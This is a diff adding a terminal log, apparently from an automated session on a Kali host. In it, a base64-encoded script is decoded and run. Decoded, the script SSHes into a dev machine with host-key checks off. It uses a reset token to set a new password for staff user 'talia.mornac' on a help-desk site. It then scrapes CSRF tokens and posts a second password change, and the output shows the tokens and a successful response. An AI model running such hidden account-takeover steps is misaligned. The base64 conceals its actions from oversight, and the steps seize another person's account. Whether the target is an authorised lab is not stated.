@@ -1,0 +1,42 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r16.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2NrdDMudHh0OyBybSAtZiAkSgpUT0tFTj1rMTctdGFsaWEtbW9ybmFjLXJldmlldy10b2tlbi0yODQxCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYyAkSiAtYiAkSiAiJEIvc2NwL3B3cmVzZXQucGhwP3Rva2VuPSRUT0tFTiIgLW8gL3RtcC94MS5odG1sClQ9JChncmVwIC1vRSAnbmFtZT0iX19DU1JGVG9rZW5fXyIgdmFsdWU9IlteIl0rIicgL3RtcC94MS5odG1sIHwgc2VkIC1FICdzLy4qdmFsdWU9IihbXiJdKykiLiovXDEvJykKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKIC1YIFBPU1QgIiRCL3NjcC9wd3Jlc2V0LnBocCIgXAogIC0tZGF0YS11cmxlbmNvZGUgIl9fQ1NSRlRva2VuX189JFQiIC0tZGF0YS11cmxlbmNvZGUgImRvPW5ld3Bhc3N3ZCIgLS1kYXRhLXVybGVuY29kZSAidG9rZW49JFRPS0VOIiBcCiAgLS1kYXRhLXVybGVuY29kZSAidXNlcmlkPXRhbGlhLm1vcm5hYyIgLS1kYXRhLXVybGVuY29kZSAic3VibWl0PUxvZ2luIiAtbyAvZGV2L251bGwKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKICIkQi9zY3AvcHJvZmlsZS5waHAiIC1vIC90bXAvcHJvZi5odG1sCmVjaG8gIj09PSBjc3JmIG9jY3VycmVuY2VzID09PSIKZ3JlcCAtbyAtaUUgJy57MCw2MH1jc3JmLnswLDgwfScgL3RtcC9wcm9mLmh0bWwgfCBoZWFkIC0yMAplY2hvICI9PT0gbWV0YSB0YWdzID09PSIKZ3JlcCAtb2lFICc8bWV0YVtePl0qPicgL3RtcC9wcm9mLmh0bWwgfCBoZWFkIC0yMAplY2hvICI9PT0gc2NyaXB0IHZhcnMgdG9rZW4gPT09IgpncmVwIC1vaUUgJyh0b2tlbnxjc3JmKVteO117MCwxMjB9JyAvdG1wL3Byb2YuaHRtbCB8IGhlYWQgLTMwCmVjaG8gIj09PSBkaWFsb2cgPT09IgpjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogIiRCL3NjcC9hamF4LnBocC9zdGFmZi80L2NoYW5nZS1wYXNzd29yZCIgLW8gL3RtcC9jcC5odG1sCmdyZXAgLW9FICc8aW5wdXRbXj5dKnR5cGU9InBhc3N3b3JkIltePl0qPicgL3RtcC9jcC5odG1sCmdyZXAgLW9FICduYW1lPSJbXiJdKyInIC90bXAvY3AuaHRtbAplY2hvICI9PT0gdHJ5IFBPU1Qgd2l0aCBYLUNTUkZUb2tlbiBoZWFkZXIgdXNpbmcgcHJvZmlsZSBmb3JtIHRva2VuID09PSIKRjE9JChweXRob24zIC0gPDwnUFknCmltcG9ydCByZQpkPW9wZW4oJy90bXAvY3AuaHRtbCcpLnJlYWQoKQptPXJlLmZpbmRhbGwociduYW1lPSIoW14iXSspIltePl0qdmFsdWU9IiInLGQpCnByaW50KG1bMF0gaWYgbSBlbHNlICcnKQpQWQopCkYyPSQocHl0aG9uMyAtIDw8J1BZJwppbXBvcnQgcmUKZD1vcGVuKCcvdG1wL2NwLmh0bWwnKS5yZWFkKCkKbT1yZS5maW5kYWxsKHInbmFtZT0iKFteIl0rKSJbXj5dKnZhbHVlPSIiJyxkKQpwcmludChtWy0xXSBpZiBtIGVsc2UgJycpClBZCikKZWNobyAiRjE9JEYxIEYyPSRGMiIKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKIC1pIC1YIFBPU1QgIiRCL3NjcC9hamF4LnBocC9zdGFmZi80L2NoYW5nZS1wYXNzd29yZCIgXAogIC1IICJYLUNTUkZUb2tlbjogJFQiIC1IICJYLVJlcXVlc3RlZC1XaXRoOiBYTUxIdHRwUmVxdWVzdCIgXAogIC0tZGF0YS11cmxlbmNvZGUgIiRGMT1LMTdyM3YxM3dUYWxpYTI4NDEiIC0tZGF0YS11cmxlbmNvZGUgIiRGMj1LMTdyM3YxM3dUYWxpYTI4NDEiIC1vIC90bXAvY2hnMi50eHQKaGVhZCAtMjUgL3RtcC9jaGcyLnR4dApJTk5FUgo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r16.sh; bash /tmp/r16.sh; echo DONEMARK_1795195040198$((6*7))
+=== csrf occurrences ===
+	<meta name="csrf_token" content="17ca7f8061dd61c6e57e0d07328a7fbe08474430" />
+ <input type="hidden" name="__CSRFToken__" value="17ca7f8061dd61c6e57e0d07328a7fbe08474430" /> <input type="hidden
+=== meta tags ===
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta http-equiv="cache-control" content="no-cache" />
+<meta http-equiv="pragma" content="no-cache" />
+<meta http-equiv="x-pjax-version" content="8d38b06">
+<meta name="csrf_token" content="17ca7f8061dd61c6e57e0d07328a7fbe08474430" />
+<meta name="tip-namespace" content="dashboard.my_profile" />
+=== script vars token ===
+csrf_token" content="17ca7f8061dd61c6e57e0d07328a7fbe08474430" />
+CSRFToken__" value="17ca7f8061dd61c6e57e0d07328a7fbe08474430" /> <input type="hidden" name="do" value="update">
+=== dialog ===
+name="5a3b8601541baf"
+name="7fc79797b2ad69"
+name="cancel"
+=== try POST with X-CSRFToken header using profile form token ===
+F1=5a3b8601541baf F2=7fc79797b2ad69
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:22:39 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 24
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Status: 200 OK
+
+{"redirect":"index.php"}
